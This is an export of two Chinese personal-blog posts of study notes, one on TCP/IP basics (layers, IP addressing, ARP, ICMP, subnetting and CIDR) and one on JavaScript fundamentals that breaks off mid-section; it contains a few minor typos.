Reply（回显应答）</p>\n<p>ICMP经常被用于测试，比如测试连接的ping命令实际上就是在使用ICMP。ping向某个IP地址发送一个数据报，并且要求目的计算机在响应中返回所发送的数据。ping实际使用的命令是ICMP的Echo Request和Echo Reply</p>\n</li>\n<li><p>Source Quench（源抑制）</p>\n</li>\n<li><p>Destination Unreachable（目的不可到达）</p>\n</li>\n<li><p>Time Exceeded（超时）</p>\n</li>\n<li><p>Fragmentation Needed（需要分段）</p>\n</li>\n</ul>\n<h2 id=\"五、子网划分和CIDR\"><a href=\"#五、子网划分和CIDR\" class=\"headerlink\" title=\"五、子网划分和CIDR\"></a>五、子网划分和CIDR</h2><p>子网划分让数据报能够到达面向较小地址空间的路由器，最早源于地址分类系统。CIDR不需要关心地址类别。</p>\n<h3 id=\"5-1网络划分\"><a href=\"#5-1网络划分\" class=\"headerlink\" title=\"5.1网络划分\"></a>5.1网络划分</h3><p>像A类网络可以容纳超过1600万台主机，此时把网络划分为独立的物理网络能够增加网络的整体性能。子网划分就是在网络ID之下提供了第2层逻辑组织，路由器能把数据报发送给网络里的某个子网地址（一般对应于一个网段），当数据报到达子网之后，就会被ARB解析为物理地址。</p>\n<p>TCP/IP规定借用主机ID的一些位来形成子网地址，用<strong>子网掩码</strong>来指明地址中的多少位用于子网ID，保留多少位作为实际的主机ID。子网掩码也是32位的二进制值，每一位代表IP地址的一个位，<strong>1表示IP地址中术语网络ID或子网ID的位，0表示属于主机ID的位</strong>。可以把子网掩码看作阅读IP地址的映射。</p>\n<p>网管通常把子网掩码作为TCP/IP配置的参数分配给每个主机。一个子网内的所有主机应该具有相同的子网ID和子网掩码。</p>\n<h3 id=\"5-2无类别域间路由CIDR\"><a href=\"#5-2无类别域间路由CIDR\" class=\"headerlink\" title=\"5.2无类别域间路由CIDR\"></a>5.2无类别域间路由CIDR</h3><p>IPv4即将耗尽，C类地址还有剩余，但地址空间比较小。使用一个CIDR前缀的值制定地址中作为网络ID的位数，这个前缀也被称为变长子网掩码VLSM，如在CIDR地址205.123.196183/25中，/25表示地址中25位用于网络ID，相应的子网掩码就是255.255.255.128。</p>\n<p>CIDR不仅可以对网络划分子网，还让ISP（Internet Service Provider）或管理员能够把多个连续C类网络聚合成一个实体。此时CIDR前缀发挥了<strong>超网掩码</strong>的作用。如ISP可以分配204.21.128.0～204.21.255.255的全部C类地址，这些网络地址的前17位是一样的，因此超网掩码是255.255.128.0。</p>\n<p>支持CIDR的路由表可以只使用一个CIDR条目204.21.128.0/17来引用这段地址的全部范围。该条目适用于与地址204.21.128.0的前17位匹配的所有地址。</p>\n","site":{"data":{}},"excerpt":"<p>本文是对《TCP/IP入门经典》前五章的梳理总结或者说一个读书笔记，主要说明了TCP/IP协议的基础知识、四层模型的结构、每层模型用到的协议，协议的主要内容等。由于篇幅关系，只写到了四层协议中的网络访问层和网际层，计划后续补全。阅读本文可以让你对于互联网的运行基础建立一个大概的印象，为深入了解TCP/IP协议打下基础。</p>","more":"<blockquote>\n<p>by MaryTien from <a href=\"http://luckymona.github.io\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io</a></p>\n</blockquote>\n<h2 id=\"一、什么是TCP-IP\"><a href=\"#一、什么是TCP-IP\" class=\"headerlink\" title=\"一、什么是TCP/IP\"></a>一、什么是TCP/IP</h2><h3 id=\"1-基础知识\"><a href=\"#1-基础知识\" class=\"headerlink\" title=\"1.基础知识\"></a>1.基础知识</h3><p>网络是计算机或类似计算机的设备之间通过常用传输介质进行通信的结合。网络协议就是一套通用功能规则，用来帮助定义复杂数据传输的过程。TCP/IP及其相关协议定义了完整的网络通信过程，被称为协议簇。</p>\n<ul>\n<li>TCP/IP标准定义了TCP/IP网络的通信规则；</li>\n<li>TCP/IP实现是一个软件组件，计算机通过它参与到TCP/IP网络中。</li>\n<li>TCP/IP标准的目的是确保所有厂商提供的TCP/IP实现都能很好地兼容。</li>\n</ul>\n<p>TCP/IP起源于美国国防部的ARPAnet网络，成为Internet比较成功的一部分，并提供两个重要特性：</p>\n<ul>\n<li>端点验证：两台实际通信的计算机都称为端点，位于信息链的末端，负责确认和验证传输，没有监视通信的中心模式</li>\n<li>动态路由选择</li>\n</ul>\n<p>个人计算机接入Internet的方法：</p>\n<ul>\n<li><p>使用modem拨号系统，它是通过一条电话线来提供网络连接的</p>\n</li>\n<li><p>与办公室其他计算机组成局域网，使用专门的网关进行协议转换，接入Internet</p>\n</li>\n</ul>\n<p>TCP/IP的特性，也是TCP/IP的核心：</p>\n<ul>\n<li><p>逻辑编址</p>\n</li>\n<li><p>路由选择</p>\n</li>\n<li><p>名称解析</p>\n</li>\n<li><p>错误控制和流量控制</p>\n</li>\n<li><p>应用支持</p>\n</li>\n</ul>\n<p>缩写：</p>\n<ul>\n<li>LAN：Local Area Network局域网</li>\n<li>TCP：Transmission Control Protocal 传输控制协议</li>\n<li>IP：Internet Protocal 网络协议</li>\n</ul>\n<h3 id=\"2-逻辑编址\"><a href=\"#2-逻辑编址\" class=\"headerlink\" title=\"2. 逻辑编址\"></a>2. 逻辑编址</h3><p>术语：</p>\n<ul>\n<li>以太网：Ethernet 一种基带局域网规范，当今最通用的局域网标准</li>\n<li>VPN：Virtual Private Network  虚拟专用网络</li>\n<li>NAT：Network Address Transition网络地址转换</li>\n</ul>\n<p>网络适配器即网卡，出厂时都分配有一个物理地址，称为MAC地址，在LAN中，低层的与硬件相关的协议使用MAC地址在物理网络中传输数据。网卡监听LAN中的每一个传输，以确定消息是否发送到它的物理地址。</p>\n<p>网管使用如路由器的设备将网络分段，以减少网络拥堵。在路由式网络中，管理员需要一种细分网络到更小的子网的方法，TCP/IP通过逻辑编址提供了子网化能力，逻辑地址是一个通过网络软件来配置的地址，称为IP地址。</p>\n<p>IP地址包括：</p>\n<ul>\n<li><p>网络ID：识别网络</p>\n</li>\n<li><p>子网ID：识别网络中的子网</p>\n</li>\n<li><p>主机ID：识别子网中计算机的主机</p>\n</li>\n</ul>\n<p>TCP/IP中使用ARP和RARP作IP地址与MAC地址的转换。</p>\n<ul>\n<li><p>ARP：Address Resolution Protocal地址解析协议</p>\n</li>\n<li><p>RARP：Reverse-  逆向地址解析协议</p>\n</li>\n</ul>\n<h3 id=\"3-路由选择\"><a href=\"#3-路由选择\" class=\"headerlink\" title=\"3.路由选择\"></a>3.路由选择</h3><p>路由器能够读取IP地址，将一个局域网连接到一个大型的网络上，可以减少网络拥塞。</p>\n<p>TCP/IP包括了定义路由器如何找到网络路径的协议。</p>\n<p>网桥、交换机和智能HUB等设备也都可以减少网络拥塞，但使用MAC地址而不是IP，因此不能执行复杂路由功能。</p>\n<h3 id=\"4-名称解析\"><a href=\"#4-名称解析\" class=\"headerlink\" title=\"4.名称解析\"></a>4.名称解析</h3><p>TCP/IP提供IP的另一种结构，为域名系统，DNS Domain Name System，域名到IP的映射称为名称解析。域名服务器是一个专用计算机，存储域名和IP的映射表。</p>\n<h3 id=\"5-错误控制和流量控制\"><a href=\"#5-错误控制和流量控制\" class=\"headerlink\" title=\"5.错误控制和流量控制\"></a>5.错误控制和流量控制</h3><p>TCP/IP提供了确保数据在网络中可靠传送的特性。传输层定义了许多错误控制、流量控制和确认功能。</p>\n<h3 id=\"6-应用支持\"><a href=\"#6-应用支持\" class=\"headerlink\" title=\"6.应用支持\"></a>6.应用支持</h3><p>一台计算机上可以运行多种网络程序，协议软件必须提供方法来判断接收到的数据包属于哪个程序。在TCP/IP中国年，这个通过系统的逻辑通道实现从网络到应用程序的接口被称为端口。可以把端口想象为计算机中的逻辑管道。</p>\n<h3 id=\"7-标准组织和RFC\"><a href=\"#7-标准组织和RFC\" class=\"headerlink\" title=\"7.标准组织和RFC\"></a>7.标准组织和RFC</h3><ul>\n<li>ICNN：互联网名称与数字地址分配机构</li>\n<li>RFC：Request For Comments 请求评议，一系列以编号排定的文件，收集有关互联网的相关信息，被称为网络知识圣经。<a href=\"http://www.rfc-editor.org可以找到RFC\" target=\"_blank\" rel=\"noopener\">www.rfc-editor.org可以找到RFC</a></li>\n</ul>\n<h2 id=\"二、TCP-IP的工作方式\"><a href=\"#二、TCP-IP的工作方式\" class=\"headerlink\" title=\"二、TCP/IP的工作方式\"></a>二、TCP/IP的工作方式</h2><h3 id=\"1-TCP-IP模型\"><a href=\"#1-TCP-IP模型\" class=\"headerlink\" title=\"1.TCP/IP模型\"></a>1.TCP/IP模型</h3><p>术语：</p>\n<ul>\n<li>网间：internetwork 指的是多个局域网互相连接形成的较大的网络</li>\n</ul>\n<p>TCP/IP协议系统划分为不同层次的组件，分别实现特定的功能，称为TCP/IP模型：</p>\n<ul>\n<li><p>应用层：网络服务 + 应用编程接口 + 网络应用程序和功能</p>\n</li>\n<li><p>传输层：TCP+UDP 提供流量控制、错误控制和确认服务，充当应用程序的接口</p>\n</li>\n<li><p>网际层：IP+ARP  实现物理地址与逻辑地址的转换，提供路由功能，支持网间的数据传递；</p>\n</li>\n<li><p>网络访问层：提供与物理网络连接的接口</p>\n</li>\n</ul>\n<h3 id=\"2-OSI模型\"><a href=\"#2-OSI模型\" class=\"headerlink\" title=\"2.OSI模型\"></a>2.OSI模型</h3><p>网络协议体系的标准的七层模型，称为OSI模型：开放互联模型，与TCP/IP是相互独立的，经常被作为一种通用框架来理解各种协议系统。</p>\n<p>在重要的传输层和网际层，OSI和TCP/IP模型是最相似的，这些层包含的组件最能体现网络协议之间的区别，所以很多协议根据其传输层和网络层进行命名。TCP/IP名称就来自于TCP（传输层协议）和IP（一个网际层协议）。</p>\n<p>应用层、表示层、会话层    ===》    应用层</p>\n<p>传输层                    ===》    传输层</p>\n<p>网络层                    ===》    网际层</p>\n<p>数据链路层、物理层        ===》    网络访问层</p>\n<h3 id=\"3-数据包\"><a href=\"#3-数据包\" class=\"headerlink\" title=\"3.数据包\"></a>3.数据包</h3><p>在数据发送过程中，其流程从TCP/IP四层模型堆栈的从上到下，每一层都把相关的信息（称为‘报头’）捆绑到实际数据上，包含包头信息和数据的数据包作为下一层的数据，再次被添加报头信息和重新打包。当数据到达目的计算机时，使用相关的过程一层层解包并最终使用其中的信息。</p>\n<p>前一个过程像俄罗斯套娃，在物理网络中如以太网，数据在网络访问层杯分解为较小的单元，像把套娃分解为碎片，把这些碎片封装到很小的娃娃里，再把他们以1和0的模式表示。接收端收到这些1和0之后，重新组合为小娃娃，再重建整个套娃。</p>\n<p>数据包在每一层的形式和名称：</p>\n<ul>\n<li><p><strong>应用层</strong>的数据包称为<strong>消息</strong></p>\n</li>\n<li><p><strong>传输层</strong>封装消息生成新的数据包，如果来自于传输层的TCP协议，就称为<strong>分段</strong>；如果来自UDP协议，就称为<strong>数据报</strong></p>\n</li>\n<li><p><strong>网际层</strong>封装传输层的分段生成的数据包，也称为<strong>数据报</strong></p>\n</li>\n<li><p><strong>网络访问层</strong>封装数据报生成的新数据包，称为<strong>帧</strong>，帧被访问层里的最低子层转化为<strong>比特流</strong></p>\n</li>\n</ul>\n<p>TCP与UDP的区别：</p>\n<ul>\n<li>TCP是面向连接的协议，与无连接协议相比，能提供更复杂的流量控制和错误控制。TCP能确保数据的发送质量，比UDP更可靠，但比UDP的速度慢，因为要额外进行错误检测和流量控制。</li>\n<li>UDP是个无连接的协议，比TCP快，但是不可靠，它把错误控制的责任推给了应用。</li>\n</ul>\n<h2 id=\"三、TCP-IP模型之网络访问层\"><a href=\"#三、TCP-IP模型之网络访问层\" class=\"headerlink\" title=\"三、TCP/IP模型之网络访问层\"></a>三、TCP/IP模型之网络访问层</h2><p>网络访问层主要管理着对网络硬件的访问。它定义了与网络硬件交互和访问传输介质的过程。是TCP/IP协议栈中变化最多、最复杂的一层。一定要牢记：逻辑IP地址只存在于软件之中。</p>\n<p><strong>网络体系</strong>：包含对物理网络的定义，及该物理网络上定义的通信规范，规范包含以下方面：访问方法、数据帧格式、布线类型、布线规则</p>\n<p>网络访问层包含如下网络体系：</p>\n<ul>\n<li>IEEE802.3      以太网        大多数办公室和家庭使用的基于线缆的局域网<ul>\n<li>IEEE802.11无线网络        即WIFI<ul>\n<li>IEEE802.16WiMAX    用于移动通信长距离无线网络技术<ul>\n<li>点到点协议PPP    Modem通过电话线连接的技术</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"3-1以太网\"><a href=\"#3-1以太网\" class=\"headerlink\" title=\"3.1以太网\"></a>3.1以太网</h3><p>以太网是目前使用最广泛的局域网技术，在典型以太网上，所有计算机共享同个传输介质。使用CSMA/CD的方法（载波侦听多路访问／冲突检测），来判断计算机何时可以把数据发送到访问介质。</p>\n<p><strong>CSMA/CD</strong>可以比喻为一个有很多人的房间。若有人想讲话，首先要确认目前是否有人在讲话（这就是<strong>载波侦听</strong>）。若两人同时开始讲话，他们都会发现这个问题，从而停止讲话，等一段时间再开始讲话（这就是<strong>冲突检测</strong>）。</p>\n<p>传统以太网在中低负载情况下运行良好，大负载下由于冲突增多而影响性能，现代以太网中会使用<strong>网络交换机</strong>对流量进行管理，以减少冲突。早期以太网中，所有计算机通过一条同轴线缆连接（就像电路串联），现代以太网中，每台计算机都连接到中央网络设备如<strong>交换机</strong>中，再由交换机接入Internet（就像电路串联）。</p>\n<p>以太帧的传输过程：</p>\n<p>网际层的数据==》{ 进入网络访问层：把数据分成块—&gt;数据块打包成帧—&gt;OSI模型物理层的底层组件把帧转换成比特流—&gt;传输介质  }==》介质传输到别的网卡</p>\n<p>以太帧中包含<strong>帧校验序列（FCS）</strong>FCS是校验数据传输的常见方式，发送方计算帧的循环冗余码校验值（<strong>CRC</strong>值），把这个值写到帧里。接收方计算机重新计算CRC，与FCS字段的值进行比较，如果两个值不相同，就表示传输过程中发生了数据丢失或改变，就需要重新传输这一帧。</p>\n<h2 id=\"四、TCP-IP模型之网际层\"><a href=\"#四、TCP-IP模型之网际层\" class=\"headerlink\" title=\"四、TCP/IP模型之网际层\"></a>四、TCP/IP模型之网际层</h2><p>一个网段（如一个以太局域网）上的计算机能够使用网络访问层提供的MAC地址进行通信，网际层提供的协议负责局域网网段之外的传递，<strong>重要的协议包括IP、ARP和ICMP</strong>（Internet Control Message Protocal 即Internet控制报文协议）。</p>\n<h3 id=\"4-1寻址与发送\"><a href=\"#4-1寻址与发送\" class=\"headerlink\" title=\"4.1寻址与发送\"></a>4.1寻址与发送</h3><p>在网络访问层，像以太网网卡对于上层协议一点不了解的，它只监听是否受到了数据帧，发现其中目标地址与自己物理地址相符的帧，并把这个帧传给上层协议栈，这种使用物理寻址的方式适合单个局域网网段。但在路由式网络中，不能利用物理地址实现数据传输，因此TCP/IP隐藏了物理地址，以一种逻辑化、层次化的寻址方案对网络进行组织。这种逻辑寻址方案由网际层的IP协议维护，因而逻辑地址被称为IP地址。</p>\n<p>在一个路由式网络中，TCP/IP软件使用如下策略在网络上发送数据：</p>\n<ol>\n<li><p>如果目的地址与源地址在同个网段，源计算机直接把数据包发给目的计算机。IP地址被解析为物理地址，数据被直接发送到目的网卡</p>\n</li>\n<li><p>如果不在同个网段，就执行下列过程：</p>\n<p>a. 直接将数据报发到网关，网关是局域网中的一个设备（网关也算是一个路由器），能把数据报转发到其他网段。网关地址被ARP解析为物理地址，数据被发送到网关的网络适配器。</p>\n<p>b. 数据报通过网关被路由到较高级别的网段，再次重复上述过程，如果目的地址在这个新网段里，数据就被发送到目的，否则数据报就被发送到 另一个网关。</p>\n<p>c. 数据报经过一系列网关被转发到目的网段。目的IP地址被ARP解析为物理地址，数据被发送到目的网络适配器。</p>\n</li>\n</ol>\n<h3 id=\"4-2网际协议（IP）\"><a href=\"#4-2网际协议（IP）\" class=\"headerlink\" title=\"4.2网际协议（IP）\"></a>4.2网际协议（IP）</h3><p>IP协议提供了一种分层的、与硬件无关的寻址系统，TCP/IP网络上的每个网络适配器都有一个唯一的IP地址。通常计算机只有一个IP地址，是因为只有一个网卡，但作为路由器或代理服务器的计算机必须有多个网卡，因此有多个IP地址。</p>\n<p>IP地址包括两个部分：</p>\n<ul>\n<li>网络ID：像邮政编码，表明大致区域</li>\n<li>主机ID：像街道地址，表明区域内的准确位置</li>\n</ul>\n<ol>\n<li><p>IP报头字段</p>\n<p>每个IP数据报都以一个IP报头开始，源计算机的TCP/IP软件构造这个IP报头，目的计算机的TCP/IP软件利用IP报头中封装的信息处理数据。</p>\n<p>IP报头的最小长度是20字节，报头长度必须是32位字的整数倍，包含一系列字节，<strong>跳数</strong>代表数据报到达目的地之前必须经过的路由器的数量。</p>\n</li>\n<li><p>IP寻址</p>\n<p>IP地址是一个32位的地址，分为4个8位段，常用<strong>点分十进制</strong>来简化32位二进制地址。</p>\n<p><strong>IP地址分类：</strong></p>\n<p>A类地址：前8位表示网络ID，后24位表示主机ID，0～127</p>\n<p>B类地址：前16位表示网络ID，后16位表示主机ID，128～191</p>\n<p>C类地址：前24位表示网络ID，后8位表示主机ID，192～223</p>\n<p>D类地址：用于多播，即把一个消息发送到网络的子网</p>\n<p>E类地址：实验性质的，一般不用于生产环境，240～247</p>\n<p><strong>子网：</strong></p>\n<p>划分子网的实质是借用主机ID中的一些位，把网络划分为更小的次级网络。</p>\n</li>\n<li><p>特殊的IP地址</p>\n<ul>\n<li><p>全0的主机ID表示网络本身，如129.152.0.0是指网络ID为129.152的B类网络。</p>\n</li>\n<li><p>全1的主机ID表示广播，即向网络中全部主机发送消息，如129.152.255.255就是网络ID为129.152的B类网络的广播地址。</p>\n</li>\n<li><p>地址255.255.255.255也可以用于网络上的广播。</p>\n</li>\n<li><p>以十进制127开头的地址是还回地址，目的地址为还回地址的消息是由本地TCP/IP软件发送的，目的在于测试TCP/IP软件是否工作正常，如Ping功能，通常使用的还回地址是127.0.0.1</p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"4-3-ARP（地址解析协议）与RARP（逆向-）\"><a href=\"#4-3-ARP（地址解析协议）与RARP（逆向-）\" class=\"headerlink\" title=\"4.3 ARP（地址解析协议）与RARP（逆向-）\"></a>4.3 ARP（地址解析协议）与RARP（逆向-）</h3><p>网段上每台主机在内存中都保存着一个ARP表或称为ARP缓存的表格，其中包含着网段上其他主机的IP地址与物理地址的对应关系。当主机需要向网段上的其他主机发送数据时，他会查看ARP缓存来获得目的物理地址。ARP缓存是动态变化的，如果目的IP在缓存中找不到，主机就会发送一个名为<strong>ARP请求帧</strong>的广播。网段上的其他主机接收到这个ARP请求，拥有这个目的IP地址的主机会向发出请求的主机发送自己的物理地址，这个目的IP与物理地址的对应关系会添加到请求主机的ARP缓存里面。</p>\n<p>RARP常与BOOTP协议共同使用来启动无盘工作站。</p>\n<p><strong>BOOTP</strong>：用来远程启动计算机或其它网络设备的协议。</p>\n<h3 id=\"4-4-ICMP-（Internet控制消息协议）\"><a href=\"#4-4-ICMP-（Internet控制消息协议）\" class=\"headerlink\" title=\"4.4 ICMP （Internet控制消息协议）\"></a>4.4 ICMP （Internet控制消息协议）</h3><p>发送到远程计算机的数据通常会经过多个路由器，这些路由器在把数据传输到最终目的地的过程中可能会发生多种问题，路由器利用ICMP消息把问题通知给源IP，ICMP还有其他调试和排错的功能。ICMP是用于诊断和测试的协议。常见ICMP消息：</p>\n<ul>\n<li><p>Echo Request（回显请求）和Echo Reply（回显应答）</p>\n<p>ICMP经常被用于测试，比如测试连接的ping命令实际上就是在使用ICMP。ping向某个IP地址发送一个数据报，并且要求目的计算机在响应中返回所发送的数据。ping实际使用的命令是ICMP的Echo Request和Echo Reply</p>\n</li>\n<li><p>Source Quench（源抑制）</p>\n</li>\n<li><p>Destination Unreachable（目的不可到达）</p>\n</li>\n<li><p>Time Exceeded（超时）</p>\n</li>\n<li><p>Fragmentation Needed（需要分段）</p>\n</li>\n</ul>\n<h2 id=\"五、子网划分和CIDR\"><a href=\"#五、子网划分和CIDR\" class=\"headerlink\" title=\"五、子网划分和CIDR\"></a>五、子网划分和CIDR</h2><p>子网划分让数据报能够到达面向较小地址空间的路由器，最早源于地址分类系统。CIDR不需要关心地址类别。</p>\n<h3 id=\"5-1网络划分\"><a href=\"#5-1网络划分\" class=\"headerlink\" title=\"5.1网络划分\"></a>5.1网络划分</h3><p>像A类网络可以容纳超过1600万台主机，此时把网络划分为独立的物理网络能够增加网络的整体性能。子网划分就是在网络ID之下提供了第2层逻辑组织，路由器能把数据报发送给网络里的某个子网地址（一般对应于一个网段），当数据报到达子网之后，就会被ARB解析为物理地址。</p>\n<p>TCP/IP规定借用主机ID的一些位来形成子网地址，用<strong>子网掩码</strong>来指明地址中的多少位用于子网ID，保留多少位作为实际的主机ID。子网掩码也是32位的二进制值，每一位代表IP地址的一个位，<strong>1表示IP地址中术语网络ID或子网ID的位，0表示属于主机ID的位</strong>。可以把子网掩码看作阅读IP地址的映射。</p>\n<p>网管通常把子网掩码作为TCP/IP配置的参数分配给每个主机。一个子网内的所有主机应该具有相同的子网ID和子网掩码。</p>\n<h3 id=\"5-2无类别域间路由CIDR\"><a href=\"#5-2无类别域间路由CIDR\" class=\"headerlink\" title=\"5.2无类别域间路由CIDR\"></a>5.2无类别域间路由CIDR</h3><p>IPv4即将耗尽，C类地址还有剩余，但地址空间比较小。使用一个CIDR前缀的值制定地址中作为网络ID的位数，这个前缀也被称为变长子网掩码VLSM，如在CIDR地址205.123.196183/25中，/25表示地址中25位用于网络ID，相应的子网掩码就是255.255.255.128。</p>\n<p>CIDR不仅可以对网络划分子网，还让ISP（Internet Service Provider）或管理员能够把多个连续C类网络聚合成一个实体。此时CIDR前缀发挥了<strong>超网掩码</strong>的作用。如ISP可以分配204.21.128.0～204.21.255.255的全部C类地址，这些网络地址的前17位是一样的，因此超网掩码是255.255.128.0。</p>\n<p>支持CIDR的路由表可以只使用一个CIDR条目204.21.128.0/17来引用这段地址的全部范围。该条目适用于与地址204.21.128.0的前17位匹配的所有地址。</p>"},{"title":"Javascript基础4","date":"2016-09-20T14:00:00.000Z","toc":true,"comments":1,"_content":"摘要：\n\n1. for in 循环如果属性值为null和undefined，ES3报错，ES5终止循环，故使用前需要检测值是否为null和undefined\n2. JS不存在块级作用域，所以for循环中定义的变量，循环外可访问\n3. for in循环实际使用前最好检测值是否为null或者是undefined\n4. label语句，给循环起个名字loopName，需要的时候就可以在循环中用break loopName跳出循环，或者continue loopName，多用在循环嵌套的时候\n5. switch语句使用全等操作符，所以并不会进行数据类型转换，数组的indexOf和laseIndexOf也使用全等操作符\n6. 函数return的例外：遇到try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码\n7. arguments与数组相似：可以用arguments[n]访问值，有length属性。但没有数组的方法\n\n\n<!-- more -->\n\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/20/read-book-professional-javascript4](http://supermaryy.com/2016/09/20/read-book-professional-javascript4)\n\n# 一、语句 #\n\n1. for会自动调用Boolean()函数，把条件语句，转换成布尔值。\n\n2. for(var i=0; i<3; i++){} 循环中定义的变量i，循环外部也可以访问，因为JS不存在块级作用域\n\n3. **for in循环**可以遍历对象的属性，没有一定的顺序，如果属性值为null和undefined，ES3下会抛出错误，ES5中会中断循环，~~但是实际执行时并没有中断~~，所以实际使用前最好检测值是否为null或者是undefined：\n```\n// 这种写法不会中断：\nvar x;\nvar aa = { \n    bb:null,\n    cc:x,\n    dd:\"1\"\n}\n\nfor(var propName in aa){\nconsole.log(aa[propName]);\n}\n// 结果：null/undefined/1\n\n// 这种写法会中断：\narr = new Array(3); // [undefined × 3]\narr.forEach(()=>console.log('have done'));  // 没有打印，浏览器语句返回值undefined\nfor(var i in arr) console.log('have done'); // 没有打印，浏览器语句返回值undefined\nfor(var i of arr) console.log('have done'); //3次\"have done\"\n```\n\n4. **label 语句**\nlabel语句主要是与for循环配合使用，结合break和continue，可以跳出循环。多用在循环嵌套的时候\n```\n//下面例子结合break，continue同理\noutLoop:\nfor(var i=0; i<4; i++){\n    innerLoop:\n    for(var j=0; j<4; j++){\n        if(i==2 && j==2){\n            break outLoop;\n        }\n        console.log('i:'+i+\",j:\"+j);\n    }\n}\n// 输出值：\n i:0,j:0\n i:0,j:1\n i:0,j:2\n i:1,j:0\n```\n\n5. **with 语句**\n简化对同一个对象的多次操作，如：\n```\nvar obj = {a:'11', b:'22'}；\nobj.a = 'aa';\nobj.b = 'bb';\n\n// 简化后：\nvar obj = {a:'11', b:'22'}；\nwith(obj){\n    var c = \"cc\"\n    a = 'aa';\n    b = 'bb';\n}\n```\nwith代码块形成一个作用域，就是obj。JS解析时，会将with代码块中的所有变量a/b/c当做局部变量，如果局部环境中找不到定义a/b，就从obj的属性中查找，如果找到了就覆盖obj中的变量，如果找不到，就从with所在的外部作用域中找。\n>这意味着在 with 语句的代码块内部，每个变量首先被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查询location 对象中是否有同名的属性。如果发现了同名属性， 则以 location 对象属性的值作为变量的值。这样会导致性能下降，不推荐使用。\n\n6. **switch**\n需要混合的时候，要加注释：\n```\n\nswitch(i){\n    case 12:\n        //合并两种情形\n    case 13:\n        console.log('hhh');\n        break;\n    case 14:\n        console.log('14');\n        bresak;\n}\n```\n据JS精粹这本书，贯穿的时候，每个都写break：\n```\nswitch(i){\n    case 12:\n    case 13:\n        break;\n}\n\n//上面写法易出错，且很难发现，应该这么写\nswitch(i){\n    case 12:\n        break;\n    case 13:\n        break;\n}\n```\n**switch使用的全等操作符，所以并不会进行数据类型转换**\n\n7. **函数**\n\n    - 函数定义时不必指定是否返回值；\n    - 如果加了return，只执行到return语句，后面的永远不会被执行，\n    - 例外：try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码\n    - 如果return语句不加返回值，默认将返回undefined\n\n8. **参数**\n\n    + arguments可以与命名参数一起使用\n    + arguments与数组相似：可以用arguments[n]来访问值，有length属性。但不是数组，没有数组的方法：slice、splice、shift、unshift、push、pop、concat、join、sort、reverse\n    + arguments的值永远与命名参数的值保持同步，其与命名参数并不是访问相同的内存空间，但是值会同步，没有传递值的；命名参数值默认被赋予undefined\n    + ** 函数所有传参都是按值传递，不可能通过引用传参 **\n    结论：对于数字、字符串等是将它们的值传递给了函数参数，函数参数的改变不会影响函数外部的变量；对于数组和对象等是将对象(数组)变量的值传递给了函数参数，这个值是指向对象(数组)的地址。\n\n    **函数传参的过程是把函数外部的变量的值复制给函数的局部变量，这个局部变量是指arguments的某个值。**\n    这句话对于理解引用类型传参时也是按值传递非常重要，检验是否理解引用类型按值传参的一段代码：\n    ```\n    function setName(obj) {\n        obj.name = 'aaa';\n        var obj = new Object();\n        obj.name = 'ccc';\n        return obj;\n    }\n    var person = new Object();\n    person.name = 'bbb';\n\n    var newPerson = setName(person);\n    console.log(person.name + ' | ' + newPerson.name); // aaa | ccc\n    ```\n\n# 二、变量、作用域和内存问题 #\n\n1. **基本类型和引用类型的值**\n\n    + 定义基本类型值和引用类型值的过程：创建一个变量并为该变量赋值\n    + 基本类型值指的是简单的数据段，而引用类型值指可能有多个值构成的对象\n    + 5种基本数据类型是按值访问的，因为可以操作保存在变量中的实际的值\n    + 引用类型的值是保存在内存中的对象的地址。JavaScript不允许直接访问内存中的位置，也就是说不能直接操作对象的内存空间。\n    + 操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的\n\n2. **堆栈**\n\n    堆存储：类似书架与书，存取没有顺序，只要知道书的名字，就可以方便的取出想要的书\n    栈存储：类似羽毛球筒与羽毛球，先存后取，后存先取，要拿中间某一个球必须先把它上面的球全拿出来\n\n    栈的优势是存取速度比堆快，缺点是存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。堆的优势是可以动态分配内存大小，生存期也不必事先告诉编译器，垃圾收集器会自动地收走这些不再使用的数据，但是缺点是由于在运行时动态分配内存，所以存取速度较慢。\n\n    基本类型值，一旦赋值，大小就固定了，因此存储在栈内存中。引用类型的值，可以动态的改变，例如定义一个对象之后，还可以给它添加变量和方法，因此大小不固定，所以存储在堆内存中。\n\n    js中的基础类型变量，都是存放在变量对象中，JavaScript属于高级语言，高级语言中严格意义上来说并没有堆栈的区分。但是一些特殊场景会在逻辑上实现栈的存取方式，这才有了堆与栈的不同。\n\n    理解堆栈存储：\n    ```\n    function Person(id,name,age){ \n        this.id = id; \n        this.name = name; \n        this.age = age; \n    } \n    var num = 10; \n    var bol = true; \n    var str = \"abc\"; \n    var obj = new Object(); \n    var arr = ['a','b','c']; \n    var person = new Person(100,\"jxl\",22);\n    ```\n    [stack-pic](http://o798x2hdw.bkt.clouddn.com/stack.png)\n\n3. **赋值变量值**\n\n    + 从一个变量向另一个变量复制基本类型值，会在变量对象上创建一个新值，然后把该值复制到为新变量分配的位置上。\n    + 当复制引用类型的值时，会将原变量的值复制一份放到为新变量分配的空间中。不同的是这个值是一个指针，改变其中一个变量会影响到另一个变量\n    [copy_variable-pic](http://o798x2hdw.bkt.clouddn.com/copy-variable.png)\n\n4. **传递参数**\n\n    - JS中所有参数都是按值传递的\n    - 把函数外部的值复制给函数内部参数，就和把值从一个变量复制到另一个变量一样\n    - 传递引用类型值时传递的是指针，因此在函数中对局部变量参数的修改会反映到函数外部\n    - 可以把函数参数想象成局部变量\n\n5. **检测类型**\n    - 检测基本类型值（number\\string\\undefined\\boolean）用typeof，检测引用类型值用instanceof\n    - 如果是对象或**null**，typeof会返回\"object\"\n    - 如果是function，typeof会返回\"function\"\n    - 如果变量是给定引用类型的实例，instanceof 操作符就会返回 true\n    ```\n    var person = function(){\n      this.name = \"aa\";\n    }\n    var bill  = new person();\n    console.log(bill instanceof person)  //true\n    ```\n    - 用instanceof检测基本类型值，始终返回false，因为基本类型值不是对象\n\n6. **执行环境及作用域**\n    - **执行环境（execution context）**定义了变量或函数有权访问的其他数据\n    - 